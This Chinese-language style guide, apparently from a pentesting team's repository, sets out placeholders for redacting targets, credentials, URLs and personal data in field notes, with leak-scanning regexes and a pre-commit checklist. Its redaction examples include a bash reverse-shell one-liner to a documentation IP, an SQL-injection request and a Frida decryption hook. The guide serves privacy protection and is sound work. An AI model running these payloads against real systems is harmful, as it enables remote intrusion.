# Field-Journal 脱敏规范

> 写 field-journal、提交 PR、分享 payload、对外发报告时**必须脱敏**。下面这套占位符规范借鉴自 PentAGI 多 agent 系统的 anonymization 协议，目标是：**保留可复用价值的同时，不暴露真实目标**。

## 占位符总表

### 网络与主机

| 类型 | 占位符 | 适用场景 |
|------|-------|---------|
| 目标 IP | `{target_ip}` | 渗透目标主机 |
| 受害方 IP | `{victim_ip}` | 内网横向移动中的下一跳 |
| 远程主机 | `{remote_host}` | 通用远程地址 |
| 服务器 IP | `{server_ip}` | C2 / 中转 / 公网回连 |
| 回调域名 | `{callback_domain}` | OOB / 反弹 |
| 目标域名 | `{target_domain}` | Web / 邮件目标 |
| 受害域名 | `{victim_domain}` | 内网域名 |
| 自定义端口 | `{port}` | 非标准端口 |
| 标准端口 | 保留原值 | 80 / 443 / 22 / 445 / 3389 等保留，便于复用 |

### 凭证与密钥

| 类型 | 占位符 |
|------|-------|
| 用户名 | `{username}` |
| 密码 | `{password}` |
| 哈希值 | `{hash}` |
| 会话 token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URL 与端点

| 类型 | 占位符 |
|------|-------|
| 通用 URL | `{url}` |
| API 端点 | `{api_endpoint}` |
| 回调 URL | `{callback_url}` |
| 上传点 | `{upload_endpoint}` |
| 登录接口 | `{login_endpoint}` |

### 路径

| 类型 | 占位符 |
|------|-------|
| 安装目录 | `{install_dir}` |
| 配置文件 | `{config_path}` |
| Web 根 | `{webroot}` |
| 上传目录 | `{upload_dir}` |
| 日志路径 | `{log_path}` |

### 业务标识

| 类型 | 占位符 |
|------|-------|
| 真实姓名 | `{user_name}` |
| 邮箱 | `{user_email}` |
| 手机号 | `{phone}` |
| 工号 | `{employee_id}` |
| 订单号 | `{order_id}` |
| UUID | `{uuid}` |

## 不要脱敏的东西

为了保留经验的可复用性，下列内容**不要替换**：

- CVE 编号（`CVE-2024-1234`）
- 工具名与版本（`sqlmap 1.7.10`）
- 标准端口（80 / 443 / 445 / 1433 / 3306 等）
- 公开的 OS 版本（`Windows Server 2019`、`Ubuntu 22.04`）
- 通用 payload 模板（`<script>alert(1)</script>`、`' OR 1=1--`）
- 库名与函数名（`OpenSSL`、`memcpy`、`strncpy`）
- 协议名与字段名（`Kerberos AS-REQ`、`LDAP bind`）

## 上下文保留原则

替换时**保留语义结构**，让别人看到也知道这是什么：

```python
# ❌ 全替换成 X，看不出语义
target = "X"
url = "X/X"

# ❌ 替换太通用
target = "{target}"
url = "{url}"

# ✅ 保留上下文
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload 脱敏

### Web payload

```
原始: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

脱敏: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# 原始
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# 脱敏
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook 脚本

```javascript
// 原始
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// 脱敏
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## 二进制样本脱敏

### 哈希

记录 sha256 即可，**不要附原文件**。如果必须共享样本：

- 上 VirusTotal 或 MalwareBazaar 公开样本库
- 链接到他人已分析过的同 hash 样本

### 字符串与符号

```c
// 原始
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// 脱敏
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## 截图脱敏

- 用马赛克或纯黑遮挡：用户名、邮箱、电话、订单号、姓名
- URL 栏只露域名结构（保留路径，遮 host），或全替换
- 内网 IP 段保留前两段：`10.0.x.x` 而不是 `10.0.10.50`
- 标识企业身份的图片元素（logo / 水印）必须遮

## CTF 场景特例

CTF 题目题面、靶机 hostname、flag 格式**通常不算敏感**（靶机是公开题），但：

- 自部署的私有靶场要按真实环境对待
- 比赛结束前的 flag 不能公开
- 别人未公开的解法不要直接抄到 field-journal

## 自动检测脚本

写 field-journal 后跑一遍下面的正则，找出漏脱敏：

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# 公网 IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# 邮箱
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# 中国大陆手机号
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux 等价
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

已封装为 `skills/scripts/scan-leaks.ps1`（PowerShell，PS 5.1 / pwsh 兼容），每次提交前跑：
```powershell
powershell -File skills/scripts/scan-leaks.ps1 -Path skills/field-journal
```
CI（ci.yml `leak-scan` job）已接入该脚本，发现未脱敏信息会直接失败。

## 反向：阅读他人脱敏文档

看别人的 field-journal / writeup 时，遇到 `{target_ip}` 这类占位符，**不要替换成你自己环境的真实值再 commit**，保持占位符不变即可。

## Field-Journal 必查项

提交 field-journal 前对照这个 checklist：

```
□ 没有公网 IP（除了 CDN / 公开服务）
□ 没有真实域名（除了 example.com 等示范域）
□ 没有真实凭证 / token / hash（已替换为 {placeholder}）
□ 没有截图里漏出的姓名 / 工号 / 邮箱
□ 没有 sample 文件本身（只留 sha256）
□ JWT / OAuth code / API key 全替换
□ 内网 IP 段已模糊到前两段（10.0.x.x）
□ Payload 里的目标参数已替换为通用占位符
□ Cookie 与 session id 已替换
```

把这个 checklist 直接补到 `field-journal/_template.md` 末尾。
